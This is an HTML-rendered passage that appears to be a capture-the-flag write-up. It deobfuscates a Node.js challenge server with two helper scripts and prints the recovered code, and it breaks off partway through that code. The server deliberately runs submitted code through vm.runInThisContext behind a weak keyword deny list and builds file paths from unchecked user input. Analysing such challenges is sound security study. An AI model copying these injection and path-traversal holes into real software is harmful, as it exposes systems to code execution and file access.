</span><span class="line"><span class="kd">var</span> <span class="nx">A3a</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;U&#39;</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">E</span> <span class="o">&gt;=</span> <span class="nx">b</span><span class="p">;</span>
</span><span class="line"><span class="p">},</span> <span class="s1">&#39;q&#39;</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">E</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">;</span>
</span><span class="line"><span class="p">},</span> <span class="s1">&#39;M&#39;</span><span class="o">:</span> <span class="p">{}};</span>
</span><span class="line"><span class="nx">http</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c534&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;submissions&quot;</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">Q4</span><span class="p">);</span>
</span><span class="line"><span class="nx">ff</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;6422&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="mi">200</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">n2</span><span class="p">);</span>
</span><span class="line"><span class="nx">process</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">t2</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">a4</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="s1">&#39;Caught exception: &#39;</span><span class="p">;</span>
</span><span class="line">  <span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">b</span> <span class="o">+</span> <span class="nx">E</span><span class="p">);</span>
</span><span class="line"><span class="p">});</span>
</span><span class="line"><span class="nx">http</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">W4</span><span class="p">](</span><span class="nx">handle</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">v2</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">M4</span><span class="p">,</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">d2</span><span class="p">);</span>
</span><span class="line"><span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">c4</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Looks much better right? Well, not really.</p>

<p>First, the <code>z9o2</code> object contains primitive values and it is referenced everywhere instead of using strings and numbers directly. Code like <code>A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});</code> should be translated to <code>A.writeHead(200, {'Content-Type': 'text/plain'})</code> (<code>x['y']</code> is equivalent to <code>x.y</code> in JavaScript). I wrote a little node.js script to inline these:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">z9o2</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;p2&#39;</span><span class="o">:</span> <span class="s2">&quot;length&quot;</span><span class="p">,</span> <span class="s1">&#39;n2&#39;</span><span class="o">:</span> <span class="s2">&quot;fs&quot;</span><span class="p">,</span> <span class="s1">&#39;w4&#39;</span><span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="s1">&#39;J4&#39;</span><span class="o">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s1">&#39;v2&#39;</span><span class="o">:</span> <span class="s2">&quot;listen&quot;</span><span class="p">,</span> <span class="s1">&#39;R4&#39;</span><span class="o">:</span> <span class="s2">&quot;log&quot;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;a4&#39;</span><span class="o">:</span> <span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="s1">&#39;d2&#39;</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;c4&#39;</span><span class="o">:</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">,</span> <span class="s1">&#39;Q4&#39;</span><span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;N4&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;W4&#39;</span><span class="o">:</span> <span class="s2">&quot;createServer&quot;</span><span class="p">,</span> <span class="s1">&#39;Q2&#39;</span><span class="o">:</span> <span class="p">{},</span> <span class="s1">&#39;M4&#39;</span><span class="o">:</span> <span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;t2&#39;</span><span class="o">:</span> <span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s1">&#39;s4&#39;</span><span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="o">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;y2&#39;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;X2&#39;</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span> <span class="s1">&#39;f2&#39;</span><span class="o">:</span> <span class="s2">&quot;end&quot;</span><span class="p">,</span> <span class="s1">&#39;l2&#39;</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s1">&#39;A4&#39;</span><span class="o">:</span> <span class="s2">&quot;writeHead&quot;</span><span class="p">};</span>
</span><span class="line"><span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">toString</span><span class="p">()</span>
</span><span class="line"><span class="k">for</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">z9o2</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;number&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\[z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
</span><span class="line">        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="s2">&quot;&#39;&quot;</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">)</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">source</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Then, there are lot of conditional expressions that use the <code>r3A8.J8()</code> function like this: <code>r3A8.J8("1b") ? "k" : "runInThisContext"</code>. It seems to be some kind of hash function with a boolean output, since it’s a pure function without side effects. (<strong>Update</strong>: it turned out to be this simple only for the duration of the competition since it checks the date :) For a deeper analysis of this function, see <a href="http://wizardsofdos.de/blog/?p=1254096">this writeup</a>) I wrote another small script to resolve these:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">toString</span><span class="p">();</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">ast</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;esprima&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">source</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">var</span> <span class="nx">r3A8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span> <span class="cm">/* ... copied from the source file */</span> <span class="p">})();</span>
</span><span class="line">
</span><span class="line"><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">try</span> <span class="p">{</span>
</span><span class="line">    <span class="c1">// Match only expressions like r3A8.J8(a) ? b : c</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">object</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s2">&quot;r3A8&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;J8&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="c1">// Resolving the conditional expression</span>
</span><span class="line">      <span class="kd">var</span> <span class="nx">decision</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">arguments</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">);</span>
</span><span class="line">      <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">decision</span> <span class="o">?</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">consequent</span> <span class="o">:</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">alternate</span><span class="p">;</span>
</span><span class="line">      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">ast</span><span class="p">)</span> <span class="k">delete</span> <span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span><span class="line">      <span class="k">for</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">value</span><span class="p">)</span> <span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span><span class="line">      <span class="k">return</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
</span><span class="line">
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="nx">ast</span> <span class="k">instanceof</span> <span class="nb">Object</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">ast</span><span class="p">)</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="kd">var</span> <span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;escodegen&#39;</span><span class="p">).</span><span class="nx">generate</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">source</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>There were a few more tricks that were only present in a few lines; those were resolved by hand. After inlining most of the variables in the resulting code (modern IDEs usually provide a shortcut to easily do that), it looks like a normal node.js program now.</p>

<h2 id="the-deobfuscated-code">The deobfuscated code</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">);</span>
</span><span class="line"><span class="nx">ff</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">        <span class="kd">var</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;submissions/&#39;</span> <span class="o">+</span> <span class="nx">flag_id</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span><span class="line">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;dfsd &#39;</span><span class="p">,</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">O</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">));</span>
</span><span class="line">        <span class="k">return</span> <span class="nx">O</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
</span><span class="line">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{}</span>
</span><span class="line">    <span class="k">return</span> <span class="s1">&#39;No password found&#39;</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">        <span class="kd">var</span> <span class="nx">Z</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">statSync</span><span class="p">(</span><span class="s1">&#39;submissions&#39;</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{}</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Z</span><span class="p">)</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="s1">&#39;submissions&#39;</span><span class="p">);</span>
</span><span class="line">    <span class="nx">ff</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;submissions/&#39;</span> <span class="o">+</span> <span class="nx">flag_id</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">code</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class="line">    <span class="nx">global</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class="line">    <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">).</span><span class="nx">runInThisContext</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">checks</span> <span class="o">=</span> <span class="p">[</span>
</span><span class="line">            <span class="sr">/eval/</span><span class="p">,</span>
</span><span class="line">            <span class="sr">/global/</span><span class="p">,</span>
</span><span class="line">            <span class="sr">/Function/</span><span class="p">,</span>
</span><span class="line">            <span class="sr">/this/</span>
</span><span class="line">        <span class="p">];</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">z</span> <span class="o">&lt;</span> <span class="nx">checks</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">z</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nx">checks</span><span class="p">[</span><span class="nx">z</span><span class="p">].</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">req</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">k</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
</span><span class="line">        <span class="k">try</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">data_json</span> <span class="o">=</span> <span class="p">{};</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;flag_id&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">                <span class="nx">old_password</span> <span class="o">=</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">data_json</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
</span><span class="line">                <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your password: &#39;</span> <span class="o">+</span> <span class="nx">old_password</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
</span><span class="line">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">                <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class="line">                <span class="nx">code</span> <span class="o">=</span> <span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span><span class="line">                <span class="k">if</span> <span class="p">(</span><span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">                    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">                        <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
</span><span class="line">                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">                        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your code has runtime errors: &#39;</span> <span class="o">+</span> <span class="nx">E</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">                        <span class="k">if</span> <span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">                            <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;flag_id&#39;</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">],</span> <span class="nx">code</span><span class="p">);</span>
</span><span class="line">                            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n&#39;</span><span class="p">);</span>
</span><span class="line">                        <span class="p">}</span>
</span><span class="line">                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">                        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">E</span><span class="p">);</span>
</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                    <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is &quot;password&quot;.\n&#39;</span><span class="p">);</span>
</span><span class="line">                <span class="p">}</span>
</span><span class="line">            <span class="p">}</span>
